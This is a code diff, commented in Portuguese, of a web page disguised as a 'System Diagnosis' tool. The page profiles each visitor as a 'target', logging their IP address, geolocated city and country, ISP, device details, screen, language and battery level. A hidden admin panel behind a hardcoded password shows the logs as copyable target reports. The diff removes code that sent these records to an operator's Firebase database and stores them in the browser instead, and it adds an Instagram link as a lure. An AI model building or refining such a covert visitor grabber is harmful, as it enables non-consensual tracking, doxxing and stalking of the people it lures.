@@ -4,9 +4,6 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>System Diagnosis</title>
-<!-- Importa o Firebase Compatível -->
-<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
 
 <style>
 :root{--bg:#000000;--card:#050505;--border:#121212;--red:#ff0033;--text:#e6e6e6;--muted:#555555;--green:#00ff66;--insta:#e1306c}
@@ -65,6 +62,7 @@ body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;justif
       <div class="data-row"><span class="data-label">Bateria:</span><span id="targetBattery" class="data-val">A ler...</span></div>
     </div>
 
+    <!-- Substitua pelo seu link do Instagram -->
     <a href="https://instagram.com/o_teu_utilizador" target="_blank" class="btn-insta">📸 Seguir no Instagram</a>
     <button class="btn-admin" onclick="openAdmin()">Acessar administração</button>
   </div>
@@ -91,7 +89,7 @@ body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;justif
           <tr><th>Hora</th><th>IP</th><th>Device</th><th>Ação</th></tr>
         </thead>
         <tbody id="adminLogs">
-          <tr><td colspan="4" style="text-align:center; color:var(--muted);">A carregar dados da nuvem...</td></tr>
+          <tr><td colspan="4" style="text-align:center; color:var(--muted);">Nenhum alvo registado.</td></tr>
         </tbody>
       </table>
     </div>
@@ -113,22 +111,6 @@ body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;justif
 </div>
 
 <script>
-// Substitua abaixo pelas suas credenciais reais do Firebase Console
-const firebaseConfig = {
-  apiKey: "COLE_AQUI_A_SUA_API_KEY",
-  authDomain: "COLE_AQUI_O_AUTH_DOMAIN",
-  databaseURL: "COLE_AQUI_O_DATABASE_URL",
-  projectId: "COLE_AQUI_O_PROJECT_ID",
-  storageBucket: "COLE_AQUI_O_STORAGE_BUCKET",
-  messagingSenderId: "COLE_AQUI_O_MESSAGING_SENDER_ID",
-  appId: "COLE_AQUI_O_APP_ID"
-};
-
-if (!firebase.apps.length) {
-  firebase.initializeApp(firebaseConfig);
-}
-const db = firebase.database();
-
 let globalLogs = [];
 let textoParaCopiar = "";
 
@@ -174,6 +156,12 @@ window.onload = async function() {
   let batteryStatus = await getBatteryInfo();
   document.getElementById('targetBattery').innerText = batteryStatus;
 
+  // Carrega logs salvos anteriormente no navegador
+  let savedLogs = localStorage.getItem('system_diagnosis_logs');
+  if (savedLogs) {
+    try { globalLogs = JSON.parse(savedLogs); } catch(e) { globalLogs = []; }
+  }
+
   try {
     let res = await fetch('https://ipwho.is/');
     let data = await res.json();
@@ -188,8 +176,8 @@ window.onload = async function() {
       document.getElementById('targetLocation').innerText = `${data.city || 'N/A'}, ${data.country_code || ''}`;
       document.getElementById('targetIsp').innerText = ispVal;
 
-      // Envia os dados para a nuvem
-      db.ref('alvos').push({
+      // Cria o novo registo do alvo
+      let novoAlvo = {
         time: timeNow,
         ip: ipVal,
         address: fullAddress,
@@ -198,7 +186,11 @@ window.onload = async function() {
         screen: screenRes,
         lang: lang,
         battery: batteryStatus
-      });
+      };
+
+      // Adiciona à lista e guarda no LocalStorage
+      globalLogs.unshift(novoAlvo); // Coloca o mais recente no topo
+      localStorage.setItem('system_diagnosis_logs', JSON.stringify(globalLogs));
 
     } else {
       document.getElementById('targetIp').innerText = "Indisponível";
@@ -207,20 +199,17 @@ window.onload = async function() {
   } catch(e) {
     document.getElementById('targetIp').innerText = "Erro de rede";
   }
-
-  // Ouve os dados da nuvem em tempo real
-  db.ref('alvos').on('value', (snapshot) => {
-    globalLogs = [];
-    snapshot.forEach((childSnapshot) => {
-      globalLogs.push(childSnapshot.val());
-    });
-    updateAdminStats();
-  });
 };
 
 function openAdmin() {
   let pass = prompt('Palavra-passe de acesso:');
   if(pass === '17102007') {
+    // Atualiza os logs locais ao abrir para garantir que vê tudo o que foi gravado
+    let savedLogs = localStorage.getItem('system_diagnosis_logs');
+    if (savedLogs) {
+      try { globalLogs = JSON.parse(savedLogs); } catch(e) {}
+    }
+
     document.getElementById('home-screen').style.display = 'none';
     document.getElementById('admin-screen').style.display = 'block';
     updateAdminStats();
@@ -255,7 +244,7 @@ function updateAdminStats() {
 
 function verDetalhes(index) {
   let log = globalLogs[index];
-  textoParaCopiar = `📋 RELATÓRIO DO ALVO #${index + 1}\n\n` +
+  textoParaCopiar = `📋 RELATÓRIO DO ALVO #${globalLogs.length - index}\n\n` +
                     `• IP: ${log.ip}\n` +
                     `• Endereço Completo: ${log.address}\n` +
                     `• Provedor (ISP): ${log.isp}\n` +
